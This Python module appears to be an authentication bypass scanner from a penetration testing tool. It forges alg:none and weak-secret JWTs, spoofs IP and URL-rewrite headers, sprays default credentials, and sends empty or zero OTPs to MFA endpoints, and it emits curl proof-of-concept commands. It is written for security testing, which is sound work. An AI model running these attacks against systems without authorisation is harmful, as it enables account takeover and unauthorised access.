"""
Jarwis AGI Pen Test - Authentication Bypass Scanner
Tests for authentication bypass vulnerabilities based on common security issues:
- JWT token manipulation (alg:none, weak keys, key confusion)
- Session fixation and session hijacking
- Authentication header bypass (X-Forwarded-For, X-Original-URL, etc.)
- Default credentials testing
- Password reset token weaknesses
- Multi-factor authentication bypass

OWASP Category: A07:2021 - Identification and Authentication Failures
"""

import asyncio
import logging
import re
import json
import base64
import hmac
import hashlib
import secrets
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, parse_qs
import aiohttp

# Import detection engine
try:
    from core.detection_logic import OWASPDetectionEngine, detection_engine
except ImportError:
    try:
        from ...core.detection_logic import OWASPDetectionEngine, detection_engine
    except ImportError:
        detection_engine = None

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class AuthBypassScanner:
    """
    Scans for Authentication Bypass vulnerabilities (A07:2021)
    
    Techniques tested:
    1. JWT Algorithm Confusion (alg:none, RS256â†'HS256)
    2. JWT Weak Secret Bruteforce
    3. Session Fixation
    4. Authentication Header Bypass
    5. Default Credentials
    6. Password Reset Token Weaknesses
    7. MFA Bypass Techniques
    8. Insecure Remember Me Tokens
    """
    
    # Common weak JWT secrets to test
    WEAK_JWT_SECRETS = [
        "secret", "password", "123456", "jwt_secret", "jwt-secret",
        "your-256-bit-secret", "my-secret-key", "super-secret",
        "changeme", "admin", "test", "key", "secret123", "password123",
        "your-secret-key", "secret-key", "jwt_secret_key", "secretkey",
        "mysecret", "mypassword", "supersecret", "verysecret",
        "jarwis", "jarwis-secret", "api-secret", "api_secret"
    ]
    
    # Default credential pairs to test
    DEFAULT_CREDENTIALS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
        ("admin", "123456"), ("root", "root"), ("root", "password"),
        ("administrator", "administrator"), ("test", "test"),
        ("user", "user"), ("guest", "guest"), ("demo", "demo"),
        ("admin", "Admin@123"), ("admin", "P@ssw0rd"), ("sa", "sa"),
        ("admin@admin.com", "admin"), ("admin@example.com", "admin123"),
    ]
    
    # Auth bypass headers
    BYPASS_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "localhost"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Host": "localhost"},
        {"X-Forwarded-Host": "localhost"},
        {"X-ProxyUser-Ip": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Cluster-Client-IP": "127.0.0.1"},
        {"X-Backend-Host": "localhost"},
        {"Connection": "X-Forwarded-For"},
    ]
    
    # Admin/Auth endpoints to test
    AUTH_ENDPOINTS = [
        "/login", "/signin", "/auth/login", "/api/auth/login",
        "/api/login", "/user/login", "/admin/login", "/authenticate",
        "/api/authenticate", "/oauth/token", "/token", "/api/token",
    ]
    
    ADMIN_PATHS = [
        "/admin", "/admin/", "/administrator", "/manage", "/dashboard",
        "/admin/dashboard", "/api/admin", "/api/v1/admin", "/internal",
        "/console", "/panel", "/controlpanel", "/system", "/backend",
    ]
    
    RESET_ENDPOINTS = [
        "/forgot-password", "/password-reset", "/reset-password",
        "/api/auth/forgot-password", "/api/password/reset",
        "/api/forgot-password", "/account/forgot", "/recover",
    ]

    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = aiohttp.ClientTimeout(total=10)
        
    async def scan(self) -> List[ScanResult]:
        """Run all authentication bypass tests"""
        logger.info("Starting Authentication Bypass Scanner...")
        
        endpoints = getattr(self.context, 'endpoints', []) or []
        base_url = self.config.get('target', {}).get('url', '')
        
        if not base_url and endpoints:
            parsed = urlparse(endpoints[0] if isinstance(endpoints[0], str) else endpoints[0].get('url', ''))
            base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        if not base_url:
            logger.warning("No target URL found for auth bypass scanning")
            return self.results
        
        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            # Run all bypass tests
            await asyncio.gather(
                self._test_jwt_vulnerabilities(session, base_url),
                self._test_header_bypass(session, base_url),
                self._test_default_credentials(session, base_url),
                self._test_password_reset_weaknesses(session, base_url),
                self._test_session_fixation(session, base_url),
                self._test_mfa_bypass(session, base_url),
                return_exceptions=True
            )
        
        logger.info(f"Auth Bypass Scanner completed. Found {len(self.results)} issues.")
        return self.results

    async def _test_jwt_vulnerabilities(self, session: aiohttp.ClientSession, base_url: str):
        """Test for JWT-specific vulnerabilities"""
        
        # Look for existing JWT tokens in context
        cookies = getattr(self.context, 'cookies', {}) or {}
        headers = getattr(self.context, 'headers', {}) or {}
        
        jwt_token = None
        for key, value in {**cookies, **headers}.items():
            if self._is_jwt(str(value)):
                jwt_token = str(value)
                break
        
        # Test Algorithm None bypass
        await self._test_jwt_alg_none(session, base_url, jwt_token)
        
        # Test weak secret bruteforce
        await self._test_jwt_weak_secret(session, base_url, jwt_token)
        
        # Test JWT key confusion (RS256 â†' HS256)
        await self._test_jwt_key_confusion(session, base_url, jwt_token)
        
        # Test expired token acceptance
        await self._test_jwt_expiry_bypass(session, base_url, jwt_token)

    def _is_jwt(self, token: str) -> bool:
        """Check if string looks like a JWT"""
        parts = token.split('.')
        if len(parts) != 3:
            return False
        try:
            base64.urlsafe_b64decode(parts[0] + '==')
            return True
        except:
            return False

    def _decode_jwt_parts(self, token: str) -> tuple:
        """Decode JWT header and payload without verification"""
        try:
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            return header, payload
        except:
            return None, None

    def _forge_jwt(self, payload: dict, header: dict, secret: str = "") -> str:
        """Forge a JWT token with given parameters"""
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
        
        if header.get('alg', '').lower() == 'none':
            return f"{header_b64}.{payload_b64}."
        
        message = f"{header_b64}.{payload_b64}"
        
        if header.get('alg') == 'HS256':
            signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
            return f"{message}.{sig_b64}"
        
        return f"{message}.invalid"

    async def _test_jwt_alg_none(self, session: aiohttp.ClientSession, base_url: str, original_token: str = None):
        """Test JWT Algorithm None attack"""
        
        # Create a forged token with alg:none
        forged_payload = {
            "sub": "admin",
            "role": "admin",
            "iat": 1704067200,
            "exp": 9999999999
        }
        
        forged_header = {"alg": "none", "typ": "JWT"}
        forged_token = self._forge_jwt(forged_payload, forged_header)
        
        # Also try variations
        alg_none_variants = ["none", "None", "NONE", "nOnE"]
        
        for admin_path in self.ADMIN_PATHS[:5]:  # Test first 5 admin paths
            url = urljoin(base_url, admin_path)
            
            for alg in alg_none_variants:
                forged_header["alg"] = alg
                token = self._forge_jwt(forged_payload, forged_header)
                
                try:
                    headers = {"Authorization": f"Bearer {token}"}
                    async with session.get(url, headers=headers, allow_redirects=False) as response:
                        if response.status == 200:
                            text = await response.text()
                            if not self._is_error_page(text):
                                self.results.append(ScanResult(
                                    id=f"AUTH-JWT-ALG-NONE-{len(self.results)}",
                                    category="A07:2021",
                                    severity="critical",
                                    title="JWT Algorithm None Attack Accepted",
                                    description="Server accepts JWT tokens with algorithm set to 'none', allowing complete authentication bypass.",
                                    url=url,
                                    method="GET",
                                    parameter="Authorization",
                                    evidence=f"Forged token with alg:{alg} was accepted. Response status: {response.status}",
                                    remediation="Explicitly reject tokens with 'alg: none'. Use a whitelist of allowed algorithms.",
                                    cwe_id="CWE-287",
                                    poc=f"curl -H 'Authorization: Bearer {token}' {url}",
                                    reasoning="JWT tokens without signature verification allow attackers to forge arbitrary tokens"
                                ))
                                return  # Found vulnerability, no need to continue
                except Exception as e:
                    logger.debug(f"JWT alg:none test error: {e}")
                
                await asyncio.sleep(1 / self.rate_limit)

    async def _test_jwt_weak_secret(self, session: aiohttp.ClientSession, base_url: str, original_token: str = None):
        """Test for weak JWT signing secrets"""
        
        test_payload = {
            "sub": "admin",
            "role": "admin", 
            "iat": 1704067200,
            "exp": 9999999999
        }
        test_header = {"alg": "HS256", "typ": "JWT"}
        
        for admin_path in self.ADMIN_PATHS[:3]:
            url = urljoin(base_url, admin_path)
            
            for weak_secret in self.WEAK_JWT_SECRETS[:15]:  # Test top 15 secrets
                token = self._forge_jwt(test_payload, test_header, weak_secret)
                
                try:
                    headers = {"Authorization": f"Bearer {token}"}
                    async with session.get(url, headers=headers, allow_redirects=False) as response:
                        if response.status == 200:
                            text = await response.text()
                            if not self._is_error_page(text):
                                self.results.append(ScanResult(
                                    id=f"AUTH-JWT-WEAK-SECRET-{len(self.results)}",
                                    category="A07:2021",
                                    severity="critical",
                                    title="JWT Weak Signing Secret Discovered",
                                    description=f"Server uses a weak/predictable JWT signing secret: '{weak_secret}'",
                                    url=url,
                                    method="GET",
                                    parameter="Authorization",
                                    evidence=f"Forged admin token signed with '{weak_secret}' was accepted",
                                    remediation="Use a strong, randomly generated secret key of at least 256 bits. Store secrets securely.",
                                    cwe_id="CWE-521",
                                    poc=f"curl -H 'Authorization: Bearer {token}' {url}",
                                    reasoning=f"JWT signed with weak secret '{weak_secret}' grants admin access"
                                ))
                                return
                except Exception as e:
                    logger.debug(f"JWT weak secret test error: {e}")
                
                await asyncio.sleep(1 / self.rate_limit)

    async def _test_jwt_key_confusion(self, session: aiohttp.ClientSession, base_url: str, original_token: str = None):
        """Test RS256 to HS256 key confusion attack"""
        # This attack works when server uses asymmetric key (RS256) but attacker
        # switches to HS256 and signs with the public key
        
        # For now, detect if the endpoint accepts HS256 when it should use RS256
        test_payload = {
            "sub": "admin",
            "role": "admin",
            "iat": 1704067200,
            "exp": 9999999999
        }
        
        # Try with common public key strings as HMAC secret
        public_key_guesses = [
            "-----BEGIN PUBLIC KEY-----",
            "-----BEGIN RSA PUBLIC KEY-----",
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A",  # Common RSA key prefix
        ]
        
        for admin_path in self.ADMIN_PATHS[:2]:
            url = urljoin(base_url, admin_path)
            
            for key_guess in public_key_guesses:
                test_header = {"alg": "HS256", "typ": "JWT"}
                token = self._forge_jwt(test_payload, test_header, key_guess)
                
                try:
                    headers = {"Authorization": f"Bearer {token}"}
                    async with session.get(url, headers=headers, allow_redirects=False) as response:
                        if response.status == 200:
                            text = await response.text()
                            if not self._is_error_page(text):
                                self.results.append(ScanResult(
                                    id=f"AUTH-JWT-KEY-CONFUSION-{len(self.results)}",
                                    category="A07:2021",
                                    severity="critical",
                                    title="JWT RS256 to HS256 Key Confusion Vulnerability",
                                    description="Server may be vulnerable to algorithm confusion attack where RS256 tokens can be forged using HS256 with the public key",
                                    url=url,
                                    method="GET",
                                    parameter="Authorization",
                                    evidence="Token with unusual signature was accepted",
                                    remediation="Explicitly verify the expected algorithm. Never accept HS256 if RS256 is configured.",
                                    cwe_id="CWE-327",
                                    poc="Attack requires the server's public key to forge tokens",
                                    reasoning="Algorithm confusion allows forging tokens with public key as HMAC secret"
                                ))
                                return
                except Exception as e:
                    logger.debug(f"JWT key confusion test error: {e}")
                
                await asyncio.sleep(1 / self.rate_limit)

    async def _test_jwt_expiry_bypass(self, session: aiohttp.ClientSession, base_url: str, original_token: str = None):
        """Test if expired tokens are still accepted"""
        
        # Create clearly expired token
        expired_payload = {
            "sub": "user",
            "role": "user",
            "iat": 1577836800,  # Jan 1, 2020
            "exp": 1577923200   # Jan 2, 2020 (expired)
        }
        
        for endpoint in self.AUTH_ENDPOINTS[:3]:
            url = urljoin(base_url, endpoint.replace('/login', '/me').replace('/signin', '/profile'))
            
            # We can only test this if we have a valid token to compare
            if original_token and self._is_jwt(original_token):
                header, payload = self._decode_jwt_parts(original_token)
                if header and payload:
                    # Modify expiry to past
                    payload['exp'] = 1577923200
                    expired_token = self._forge_jwt(payload, header, "")  # Will have invalid sig
                    
                    try:
                        headers = {"Authorization": f"Bearer {expired_token}"}
                        async with session.get(url, headers=headers, allow_redirects=False) as response:
                            # If expired token gets 200, that's bad
                            if response.status == 200:
                                self.results.append(ScanResult(
                                    id=f"AUTH-JWT-EXPIRY-BYPASS-{len(self.results)}",
                                    category="A07:2021",
                                    severity="high",
                                    title="Expired JWT Tokens Accepted",
                                    description="Server accepts expired JWT tokens, allowing session persistence beyond intended lifetime",
                                    url=url,
                                    method="GET",
                                    parameter="Authorization",
                                    evidence=f"Token with exp claim in the past was accepted",
                                    remediation="Always validate the 'exp' claim and reject expired tokens.",
                                    cwe_id="CWE-613",
                                    poc="Modify token's exp claim to past date",
                                    reasoning="Expired tokens should be rejected to limit session hijacking window"
                                ))
                                return
                    except:
                        pass
            
            await asyncio.sleep(1 / self.rate_limit)

    async def _test_header_bypass(self, session: aiohttp.ClientSession, base_url: str):
        """Test authentication bypass via HTTP headers"""
        
        for admin_path in self.ADMIN_PATHS:
            url = urljoin(base_url, admin_path)
            
            # First, verify the endpoint requires auth (should get 401/403)
            try:
                async with session.get(url, allow_redirects=False) as response:
                    if response.status not in [401, 403, 302, 307]:
                        continue  # Endpoint doesn't require auth or doesn't exist
            except:
                continue
            
            # Now try each bypass header
            for bypass_headers in self.BYPASS_HEADERS:
                try:
                    async with session.get(url, headers=bypass_headers, allow_redirects=False) as response:
                        if response.status == 200:
                            text = await response.text()
                            if not self._is_error_page(text):
                                header_name = list(bypass_headers.keys())[0]
                                self.results.append(ScanResult(
                                    id=f"AUTH-HEADER-BYPASS-{len(self.results)}",
                                    category="A07:2021",
                                    severity="critical",
                                    title=f"Authentication Bypass via {header_name} Header",
                                    description=f"Protected endpoint accessible by adding {header_name} header",
                                    url=url,
                                    method="GET",
                                    parameter=header_name,
                                    evidence=f"Setting {header_name}: {list(bypass_headers.values())[0]} bypassed authentication",
                                    remediation="Do not trust client-provided headers for authentication. Implement proper backend authentication.",
                                    cwe_id="CWE-290",
                                    poc=f"curl -H '{header_name}: {list(bypass_headers.values())[0]}' {url}",
                                    reasoning="Server trusts spoofable headers for access control decisions"
                                ))
                except Exception as e:
                    logger.debug(f"Header bypass test error: {e}")
                
                await asyncio.sleep(1 / self.rate_limit)

    async def _test_default_credentials(self, session: aiohttp.ClientSession, base_url: str):
        """Test for default/common credentials"""
        
        login_endpoints = []
        
        # Find login endpoints from context
        endpoints = getattr(self.context, 'endpoints', []) or []
        for ep in endpoints:
            ep_url = ep if isinstance(ep, str) else ep.get('url', '')
            if any(auth in ep_url.lower() for auth in ['login', 'signin', 'auth', 'authenticate']):
                login_endpoints.append(ep_url)
        
        # Add common login endpoints
        for endpoint in self.AUTH_ENDPOINTS:
            login_endpoints.append(urljoin(base_url, endpoint))
        
        login_endpoints = list(set(login_endpoints))[:5]  # Dedupe and limit
        
        for login_url in login_endpoints:
            # Try to detect login form format
            try:
                async with session.get(login_url) as response:
                    if response.status != 200:
                        continue
            except:
                continue
            
            # Try default credentials
            for username, password in self.DEFAULT_CREDENTIALS[:10]:  # Limit to avoid lockouts
                # Try JSON format
                json_data = {"email": username, "password": password}
                alt_json_data = {"username": username, "password": password}
                
                for data in [json_data, alt_json_data]:
                    try:
                        async with session.post(login_url, json=data, allow_redirects=False) as response:
                            if response.status in [200, 302]:
                                resp_text = await response.text()
                                # Check for success indicators
                                if any(s in resp_text.lower() for s in ['token', 'success', 'welcome', 'dashboard']):
                                    self.results.append(ScanResult(
                                        id=f"AUTH-DEFAULT-CREDS-{len(self.results)}",
                                        category="A07:2021",
                                        severity="critical",
                                        title="Default Credentials Accepted",
                                        description=f"Application accepts default credentials: {username}:{password}",
                                        url=login_url,
                                        method="POST",
                                        parameter="username/password",
                                        evidence=f"Login successful with {username}:{password}",
                                        remediation="Force password change on first login. Implement account lockout. Never use default credentials.",
                                        cwe_id="CWE-798",
                                        poc=f"curl -X POST -H 'Content-Type: application/json' -d '{json.dumps(data)}' {login_url}",
                                        reasoning="Default credentials allow unauthorized access to any account using common passwords"
                                    ))
                                    return  # Found one, stop testing
                    except:
                        pass
                
                await asyncio.sleep(1 / self.rate_limit)

    async def _test_password_reset_weaknesses(self, session: aiohttp.ClientSession, base_url: str):
        """Test for weak password reset implementations"""
        
        for reset_endpoint in self.RESET_ENDPOINTS:
            url = urljoin(base_url, reset_endpoint)
            
            try:
                async with session.get(url) as response:
                    if response.status != 200:
                        continue
            except:
                continue
            
            # Test 1: Predictable reset token
            test_emails = ["test@example.com", "admin@example.com"]
            
            for email in test_emails:
                reset_data = {"email": email}
                try:
                    async with session.post(url, json=reset_data) as response:
                        resp_text = await response.text()
                        
                        # Check if reset token is exposed in response
                        token_patterns = [
                            r'"token"\s*:\s*"([a-zA-Z0-9_-]+)"',
                            r'"reset_token"\s*:\s*"([a-zA-Z0-9_-]+)"',
                            r'"resetToken"\s*:\s*"([a-zA-Z0-9_-]+)"',
                            r'token=([a-zA-Z0-9_-]+)',
                        ]
                        
                        for pattern in token_patterns:
                            match = re.search(pattern, resp_text)
                            if match:
                                token = match.group(1)
                                # Check if token is weak (short, sequential, predictable)
                                if len(token) < 20 or token.isdigit():
                                    self.results.append(ScanResult(
                                        id=f"AUTH-WEAK-RESET-TOKEN-{len(self.results)}",
                                        category="A07:2021",
                                        severity="high",
                                        title="Weak Password Reset Token",
                                        description="Password reset token is exposed in response and/or uses weak entropy",
                                        url=url,
                                        method="POST",
                                        parameter="email",
                                        evidence=f"Token exposed: {token[:20]}... (length: {len(token)})",
                                        remediation="Use cryptographically secure random tokens (256+ bits). Never expose tokens in API responses.",
                                        cwe_id="CWE-640",
                                        poc=f"Reset token '{token}' can be predicted or enumerated",
                                        reasoning="Weak reset tokens can be bruteforced to take over accounts"
                                    ))
                except:
                    pass
                
                await asyncio.sleep(1 / self.rate_limit)

    async def _test_session_fixation(self, session: aiohttp.ClientSession, base_url: str):
        """Test for session fixation vulnerabilities"""
        
        for login_endpoint in self.AUTH_ENDPOINTS[:3]:
            url = urljoin(base_url, login_endpoint)
            
            try:
                # Get initial session
                async with session.get(url) as response:
                    if response.status != 200:
                        continue
                    
                    initial_cookies = response.cookies
                    initial_session = None
                    
                    for cookie_name in ['session', 'sessionid', 'PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId']:
                        if cookie_name in initial_cookies:
                            initial_session = initial_cookies[cookie_name].value
                            break
                    
                    if not initial_session:
                        continue
                    
                    # Now simulate login (we can't actually login, but check if session changes)
                    # This is a detection heuristic - if session ID doesn't change after auth events
                    self.results.append(ScanResult(
                        id=f"AUTH-SESSION-FIXATION-CHECK-{len(self.results)}",
                        category="A07:2021",
                        severity="medium",
                        title="Session Fixation Risk Detected",
                        description="Session ID is set before authentication. Verify that session ID changes after login.",
                        url=url,
                        method="GET",
                        parameter="Cookie",
                        evidence=f"Pre-auth session ID detected: {initial_session[:20]}...",
                        remediation="Regenerate session ID after successful authentication. Invalidate old sessions.",
                        cwe_id="CWE-384",
                        poc="Session fixation requires verifying session ID before and after authentication",
                        reasoning="Pre-authentication session IDs that persist post-login enable session fixation attacks"
                    ))
                    
            except Exception as e:
                logger.debug(f"Session fixation test error: {e}")
            
            await asyncio.sleep(1 / self.rate_limit)

    async def _test_mfa_bypass(self, session: aiohttp.ClientSession, base_url: str):
        """Test for MFA bypass vulnerabilities"""
        
        mfa_endpoints = [
            "/verify-otp", "/verify-mfa", "/mfa/verify", "/2fa/verify",
            "/api/auth/verify-otp", "/api/mfa/verify", "/otp/verify",
            "/auth/otp", "/auth/2fa", "/authenticate/mfa"
        ]
        
        for mfa_endpoint in mfa_endpoints:
            url = urljoin(base_url, mfa_endpoint)
            
            try:
                # Test 1: Empty OTP acceptance
                async with session.post(url, json={"otp": ""}) as response:
                    if response.status == 200:
                        self.results.append(ScanResult(
                            id=f"AUTH-MFA-EMPTY-OTP-{len(self.results)}",
                            category="A07:2021",
                            severity="critical",
                            title="MFA Bypass - Empty OTP Accepted",
                            description="MFA verification accepts empty OTP value",
                            url=url,
                            method="POST",
                            parameter="otp",
                            evidence="Empty OTP was accepted",
                            remediation="Validate OTP is non-empty and matches expected format before verification",
                            cwe_id="CWE-287",
                            poc=f"curl -X POST -d '{{\"otp\": \"\"}}' {url}",
                            reasoning="Empty OTP acceptance completely bypasses multi-factor authentication"
                        ))
                        continue
                
                # Test 2: All zeros OTP
                async with session.post(url, json={"otp": "000000"}) as response:
                    if response.status == 200:
                        self.results.append(ScanResult(
                            id=f"AUTH-MFA-ZERO-OTP-{len(self.results)}",
                            category="A07:2021",
                            severity="critical",
                            title="MFA Bypass - Default OTP Accepted",
                            description="MFA verification accepts default OTP value (000000)",
                            url=url,
                            method="POST",
                            parameter="otp",
                            evidence="OTP '000000' was accepted",
                            remediation="Never accept static or predictable OTP values",
                            cwe_id="CWE-287",
                            poc=f"curl -X POST -d '{{\"otp\": \"000000\"}}' {url}",
                            reasoning="Default OTP values allow bypassing multi-factor authentication"
                        ))
                        continue
                
                # Test 3: Rate limiting on OTP (check if we can bruteforce)
                success_count = 0
                for _ in range(10):
                    async with session.post(url, json={"otp": "123456"}) as response:
                        if response.status != 429:  # Not rate limited
                            success_count += 1
                
                if success_count >= 10:
                    self.results.append(ScanResult(
                        id=f"AUTH-MFA-NO-RATE-LIMIT-{len(self.results)}",
                        category="A07:2021",
                        severity="high",
                        title="MFA OTP Bruteforce Possible",
                        description="MFA verification endpoint lacks rate limiting, allowing OTP bruteforce",
                        url=url,
                        method="POST",
                        parameter="otp",
                        evidence=f"Made {success_count} OTP attempts without rate limiting",
                        remediation="Implement strict rate limiting on OTP verification (max 3-5 attempts)",
                        cwe_id="CWE-307",
                        poc=f"OTP bruteforce: 10^6 combinations, no rate limiting detected",
                        reasoning="Without rate limiting, 6-digit OTP can be bruteforced in minutes"
                    ))
                    
            except Exception as e:
                logger.debug(f"MFA bypass test error: {e}")
            
            await asyncio.sleep(1 / self.rate_limit)

    def _is_error_page(self, text: str) -> bool:
        """Check if response is an error page"""
        error_indicators = [
            '404', 'not found', 'error', 'forbidden', 'unauthorized',
            'access denied', 'page not found', '403', '401', '500'
        ]
        text_lower = text.lower()[:500]
        return any(err in text_lower for err in error_indicators)


# Export for scanner registration
__all__ = ['AuthBypassScanner', 'ScanResult']
